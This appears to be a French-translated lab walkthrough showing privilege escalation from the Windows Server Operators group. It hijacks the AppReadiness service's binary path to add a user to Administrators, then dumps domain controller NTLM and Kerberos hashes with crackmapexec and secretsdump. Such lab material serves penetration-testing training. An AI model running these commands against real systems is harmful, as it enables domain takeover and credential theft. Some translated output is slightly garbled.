Opérateurs de serveur
================

* * * * *

Le groupe [Opérateurs de serveur](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators) permet aux membres d'administrer Windows serveurs sans avoir besoin d'attribuer des privilèges d'administrateur de domaine. Il s'agit d'un groupe très privilégié qui peut se connecter localement aux serveurs, y compris les contrôleurs de domaine.

L'appartenance à ce groupe confère les puissants privilèges `SeBackupPrivilege` et `SeRestorePrivilege` et la possibilité de contrôler les services locaux.

#### Interrogation du service AppReadiness

Examinons le service `AppReadiness`. Nous pouvons confirmer que ce service démarre en tant que SYSTEM à l'aide de l'utilitaire `sc.exe` .

Interroger le service AppReadiness

```
C:\htb> sc qc AppReadiness

[SC] QueryServiceConfig RÉUSSITE

SERVICE_NAME : compatibilité avec les applications
         TYPE : 20 WIN32_SHARE_PROCESS
         START_TYPE : 3 DEMAND_START
         ERROR_CONTROL : 1 NORMALE
         BINARY_PATH_NAME : C:\Windows\System32\svchost.exe -k AppReadiness -p
         LOAD_ORDER_GROUP :
         MARQUE : 0
         DISPLAY_NAME : compatibilité avec l'application
         DEPENDANCES :
         SERVICE_START_NAME : système local

```

#### Vérification des autorisations de service avec PsService

Nous pouvons utiliser le visualiseur/contrôleur de service [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice), qui fait partie de la suite Sysinternals, pour vérifier les autorisations sur le service. `PsService` fonctionne un peu comme l'utilitaire `sc` et peut afficher l'état et les configurations du service et vous permet également de démarrer, d'arrêter, de mettre en pause, de reprendre et de redémarrer les services localement et sur des hôtes distants.

Vérification des autorisations de service avec PsService

```
C:\htb> c:\Tools\PsService.exe security AppReadiness

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

SERVICE_NAME: AppReadiness
DISPLAY_NAME: App Readiness
        ACCOUNT: LocalSystem
        SECURITY:
        [ALLOW] NT AUTHORITY\SYSTEM
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                Pause/Resume
                Start
                Stop
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Administrators
                All
        [ALLOW] NT AUTHORITY\INTERACTIVE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] NT AUTHORITY\SERVICE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Server Operators
                All
```

Cela confirme que le groupe Opérateurs de serveur dispose du droit d'accès [SERVICE_ALL_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights), ce qui nous donne un contrôle total sur ce service.

#### Vérification de l'appartenance au groupe d'administrateurs locaux

Examinons les membres actuels du groupe d'administrateurs locaux et confirmons que notre compte cible n'est pas présent.

Vérification de l'appartenance au groupe d'administrateurs locaux

```
C:\htb> net localgroup Administrateurs

Nom d'alias Administrateurs
Commentaire Les administrateurs ont un accès complet et illimité à l'ordinateur/au domaine

Membres

-------------------------------------------------- -----------------------------
Administrateur
Administrateurs de domaine
Administrateurs d'entreprise
La commande s'est terminée avec succès.

```

#### Modification du chemin binaire du service

Modifions le chemin binaire pour exécuter une commande qui ajoute notre utilisateur actuel au groupe d'administrateurs locaux par défaut.

Modification du chemin binaire du service

```
C:\htb> sc config AppReadiness binPath= "cmd /c net localgroup Administrateurs server_adm /add"

[SC] RÉUSSITE de ChangeServiceConfig

```

#### Démarrage du service

Le démarrage du service échoue, ce qui est attendu.

Démarrage du service

```
C:\htb> sc start AppReadiness

[SC] ÉCHEC du service de démarrage 1053 :

Le service n'a pas répondu à la demande de démarrage ou de contrôle en temps opportun.

```

#### Confirmation de l'appartenance au groupe d'administrateurs locaux

Si nous vérifions l'appartenance au groupe des administrateurs, nous constatons que la commande a été exécutée avec succès.

Confirmation de l'appartenance au groupe d'administrateurs locaux

```
C:\htb> net localgroup Administrateurs

Nom d'alias Administrateurs
Commentaire Les administrateurs ont un accès complet et illimité à l'ordinateur/au domaine

Membres

-------------------------------------------------- -----------------------------
Administrateur
Administrateurs de domaine
Administrateurs d'entreprise
serveur_adm
La commande s'est terminée avec succès.

```

#### Confirmation de l'accès administrateur local sur le contrôleur de domaine

À partir de là, nous avons un contrôle total sur le contrôleur de domaine et pouvons récupérer untoutes les informations d'identification de la base de données NTDS et accéder à d'autres systèmes, et effectuer des tâches de post-exploitation.

Confirmation de l'accès administrateur local sur le contrôleur de domaine

```
dsgsec@htb[/htb]$ crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'

SMB 10.129.43.9 445 WINLPE-DC01 [*] Windows 10.0 Build 17763 (nom : WINLPE-DC01) (domaine : INLANEFREIGHT.LOCAL) (signature : Vrai) (SMBv1 : Faux)
SMB 10.129.43.9 445 WINLPE-DC01 [+] INLANEFREIGHT.LOCAL\server_adm:HTB_@cademy_stdnt ! (Pwn3d !)

```

#### Récupération des hachages de mot de passe NTLM à partir du contrôleur de domaine

Récupération des hachages de mot de passe NTLM à partir du contrôleur de domaine

```
dsgsec@htb[/htb]$ secretsdump.py server_adm@10.129.43.9 -just-dc-user administrateur

Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

Mot de passe:
[*] Vidage des identifiants de domaine (domain\uid:rid:lmhash:nthash)
[*] Utilisation de la méthode DRSUAPI pour obtenir les secrets NTDS.DIT
Administrateur:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58 :::
[*] Clés Kerberos saisies
Administrateur : aes256-cts-hmac-sha1-96:5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43
Administrateur : aes128-cts-hmac-sha1-96:94c300d0e47775b407f2496a5cca1a0a
Administrateur :des-cbc-md5 :d60dfbbf20548938
[*] Nettoyer...

```